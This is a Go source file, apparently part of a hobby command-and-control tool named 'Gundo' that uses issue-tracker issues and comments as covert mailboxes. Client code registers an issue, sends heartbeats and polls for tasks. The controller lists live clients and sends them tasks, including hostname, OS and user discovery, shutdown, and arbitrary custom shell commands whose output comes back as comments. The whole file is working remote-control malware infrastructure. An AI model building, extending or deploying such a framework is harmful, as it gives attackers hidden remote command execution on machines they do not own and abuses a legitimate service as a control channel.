package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
	"uuid"
)

// temp: represents the controllers known info about a client
type ManagedClient struct {
	ClientID    string
	IssueNumber int
	LastSeen    time.Time
	Online      bool
}

func discoverClients() ([]ManagedClient, error) {
	// process used to discover available cinets

	// list all the issues representing the clients
	issues, err := listIssues()
	if err != nil {
		return nil, err
	}

	// list representing structs of clients
	var clients []ManagedClient

	// prefixes
	const clientTitlePrefix = "Gundo Client - "

	// represents the treshold to determine an agent offline

	const offlineThreshold = 6 * time.Minute

	for _, issue := range issues {

		// Ignore Issues that do not belong to Gundo clients.
		if !strings.HasPrefix(issue.Title, clientTitlePrefix) {
			continue
		}

		// recieves the client ID that comes after
		clientID := strings.TrimPrefix(
			issue.Title,
			clientTitlePrefix,
		)

		// creating a new managed client for the valid agent issue
		managedClient := ManagedClient{
			ClientID:    clientID,
			IssueNumber: issue.Number,
			Online:      false,
		}

		// receive comments to find heartbeat
		comments, err := listComments(issue.Number)
		fmt.Printf(
			"[DEBUG] Issue #%d returned %d comments\n",
			issue.Number,
			len(comments),
		)
		if err != nil {
			fmt.Printf(
				"Could not read Issue #%d: %v\n",
				issue.Number,
				err,
			)

			clients = append(clients, managedClient)
			continue
		}

		// Search newest → oldest because we only care
		// looking for the latest heartbeat.
		for i := len(comments) - 1; i >= 0; i-- {
			message, err := parseGundoMessage(comments[i].Body)
			if err != nil {
				// fmt.Printf(
				// 	"[DEBUG] Issue #%d comment %d parse failed: %v\n",
				// 	issue.Number,
				// 	comments[i].ID,
				// 	err,
				// )
				continue
			}

			// fmt.Printf(
			// 	"[DEBUG] Issue #%d | Type=%q ClientID=%q Timestamp=%q\n",
			// 	issue.Number,
			// 	message.Type,
			// 	message.ClientID,
			// 	message.Timestamp,
			// )

			if message.Type != "heartbeat" {
				continue
			}

			fmt.Printf(
				"[DEBUG] Heartbeat found. Expected client=%q Received client=%q\n",
				clientID,
				message.ClientID,
			)

			if message.ClientID != clientID {
				fmt.Println("[DEBUG] Client IDs DO NOT match")
				continue
			}

			heartbeatTime, err := time.Parse(
				time.RFC3339,
				message.Timestamp,
			)
			if err != nil {
				fmt.Printf(
					"[DEBUG] Heartbeat timestamp parse failed: %v\n",
					err,
				)
				continue
			}

			age := time.Since(heartbeatTime)

			fmt.Printf(
				"[DEBUG] Heartbeat age=%s threshold=%s\n",
				age,
				offlineThreshold,
			)

			managedClient.LastSeen = heartbeatTime

			if age < offlineThreshold {
				managedClient.Online = true
			}

			break
		}

		// adds client to the list of clients structs
		clients = append(clients, managedClient)
	}

	// returns the final list
	return clients, nil
}

// setup a runclient + a runcontroller for testing purposes

func runClient() {
	var state ClientState

	savedState, err := loadState()

	if err == nil {
		state = savedState

		fmt.Printf("[+] Loaded existing client\n")
		fmt.Printf("[+] Client ID: %s\n", state.ClientID)
		fmt.Printf("[+] Mailbox: Issue #%d\n", state.IssueNumber)

	} else if os.IsNotExist(err) {

		fmt.Println("[+] First run detected")

		clientID := uuid.New().String()

		issue := IssueRequest{
			Title: "Gundo Client - " + clientID,
			Body:  "Gundo client mailbox",
		}

		createdIssue, err := createIssue(issue)
		if err != nil {
			fmt.Printf("Failed to create mailbox: %v\n", err)
			return
		}

		state = ClientState{
			ClientID:    clientID,
			IssueNumber: createdIssue.Number,
		}

		if err := saveState(state); err != nil {
			fmt.Printf("Failed to save client state: %v\n", err)
			return
		}

		fmt.Printf("[+] Created Client ID: %s\n", state.ClientID)
		fmt.Printf("[+] Created mailbox: Issue #%d\n", state.IssueNumber)

	} else {
		fmt.Printf("Failed to load state: %v\n", err)
		return
	}

	client := newClient(state.ClientID)

	// seperate go routine to run the heartbeast concurrent with poll tasks
	go client.heartbeatLoop(state.IssueNumber)

	client.pollTasks(state.IssueNumber)
}

// polling comments to poll comments and grab results
// CLI version of pollComments()
func waitForResult(issueNumber int, taskID string) (GundoMessage, error) {
	for {
		// grab comments
		comments, err := listComments(issueNumber)
		if err != nil {
			return GundoMessage{}, err
		}

		for _, comment := range comments {
			// parses comment into Gundo Struct to read and work with
			message, err := parseGundoMessage(comment.Body)
			if err != nil {
				continue
			}

			// We only care about result messages.
			if message.Type != "result" {
				continue
			}

			// We only want the result belonging to
			// the task the controller just sent.
			if message.TaskID != taskID {
				continue
			}

			return message, nil
		}

		time.Sleep(5 * time.Second)
	}
}

// using pointer to use the same terminal reader used in run controller
func runCommandMenu(reader *bufio.Reader, client ManagedClient) {
	for {
		fmt.Printf("\n=== Client %s ===\n", client.ClientID)

		fmt.Println("1. Ping")
		fmt.Println("2. Get Hostname")
		fmt.Println("3. Get OS")
		fmt.Println("4. Get User")
		fmt.Println("5. Shutdown >:D")
		fmt.Println("6. Custom Command")
		fmt.Println("0. Back")
		fmt.Print("\nSelect command: ")

		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Error reading command: %v\n", err)
			continue
		}

		// grab choice from the list
		choice := strings.TrimSpace(input)

		// determine action
		var action string
		var command string

		switch choice {
		case "1":
			action = "ping"

		case "2":
			action = "get_hostname"

		case "3":
			action = "get_os"

		case "4":
			action = "get_user"

		case "5":
			action = "shutdown"

		case "6":
			action = "custom"
			fmt.Print("\nEnter shell command: ")
			raw, err := reader.ReadString('\n')
			if err != nil {
				fmt.Printf("Error reading command: %v\n", err)
				continue
			}
			command = strings.TrimSpace(raw)
			if command == "" {
				fmt.Println("Empty command, aborted.")
				continue
			}

		case "0":
			return

		default:
			fmt.Println("Invalid command.")
			continue
		}

		// create a task with the action and set the targetClientID with the
		// client ID of the passed in client
		task := createTaskMessage(action)
		task.TargetClientID = client.ClientID
		task.Command = command

		fmt.Printf("\n[+] Sending %s\n", action)
		fmt.Printf("[+] Task ID: %s\n", task.TaskID)

		// creates comment with the task message
		err = createComment(client.IssueNumber, task)
		if err != nil {
			fmt.Printf("Error sending task: %v\n", err)
			continue
		}

		fmt.Println("[+] Waiting for result...")

		// polling for the result from client execution
		result, err := waitForResult(
			client.IssueNumber,
			task.TaskID,
		)

		if err != nil {
			fmt.Printf("Error waiting for result: %v\n", err)
			continue
		}

		// prints the results
		fmt.Println("\n=== Result ===")
		fmt.Printf("Status: %s\n", result.Status)
		fmt.Printf("Output: %s\n", result.Output)
	}
}

func runController() {

	// read buffer for terminal
	reader := bufio.NewReader(os.Stdin)

	for {
		// creates list of clients

		clients, err := discoverClients()
		if err != nil {
			fmt.Printf("Failed to discover clients: %v\n", err)
			return
		}

		if len(clients) == 0 {
			fmt.Println("No Gundo clients found.")
			return
		}

		fmt.Println("\n=== Gundo Clients ===")

		// loop over each client
		for i, client := range clients {
			status := "OFFLINE"

			if client.Online {
				status = "ONLINE"
			}

			// formatting to print each issue
			fmt.Printf(
				"%d. %s | Issue #%d | %s\n",
				i+1,
				client.ClientID,
				client.IssueNumber,
				status,
			)
		}

		fmt.Println("0. Exit")
		fmt.Print("\nSelect client: ")

		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Error reading input: %v\n", err)
			continue
		}

		// turn string to inpute to handle choice
		choice, err := strconv.Atoi(strings.TrimSpace(input))
		if err != nil {
			fmt.Println("Invalid selection.")
			continue
		}

		if choice == 0 {
			return
		}

		// invalid client check
		if choice < 1 || choice > len(clients) {
			fmt.Println("Invalid client.")
			continue
		}

		// represents the struct at the index of the client choice
		selected := clients[choice-1]

		if !selected.Online {
			fmt.Println("[-] Client is currently offline.")
			continue
		}

		// run commands based off the selected
		runCommandMenu(reader, selected)
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage:")
		fmt.Println("  go run . client")
		fmt.Println("  go run . controller")
		return
	}

	switch os.Args[1] {
	case "client":
		runClient()

	case "controller":
		runController()

	default:
		fmt.Println("Unknown mode:", os.Args[1])
	}
}
